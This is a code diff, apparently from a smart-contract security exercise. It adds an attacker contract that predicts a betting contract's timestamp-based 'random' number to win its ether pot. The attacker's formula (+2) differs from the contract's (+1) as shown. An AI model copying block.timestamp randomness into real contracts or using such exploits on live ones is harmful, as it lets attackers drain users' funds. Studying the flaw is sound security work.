@@ -35,7 +35,6 @@ contract WeakRandomnessBet is Ownable {
     }
 
     function getRandomNumber() public view returns (uint8) {
-        console.log("timestamp in contract:", block.timestamp);
         return uint8(uint256(block.timestamp) % 100) + 1;
     }
 
@@ -45,4 +44,40 @@ contract WeakRandomnessBet is Ownable {
         prizeClaimed = true;
         payable(msg.sender).sendValue(address(this).balance);
     }
+
+    function getBetOf(address _address) external view returns (uint8) {
+        return bets[_address];
+    }
+
+        function getWinningNumber() external view returns (uint8) {
+        return winningNumber;
+    }      
+}
+
+interface IWeakRandomnessBet {
+    function placeBet(uint8 number) external payable;
+}
+
+contract WeakRandomnessBetAttack is Ownable {
+    IWeakRandomnessBet private target;
+
+    constructor(address _target) {
+        target = IWeakRandomnessBet(_target);
+    }
+
+    function attack() external payable {
+        target.placeBet{value: 1 ether}(getWinnning());
+    }
+
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+
+    function getWinnning() private view returns (uint8) {
+        return uint8(uint256(block.timestamp) % 100) + 2;
+    }
+
+ 
+
+    receive() external payable {}
 }
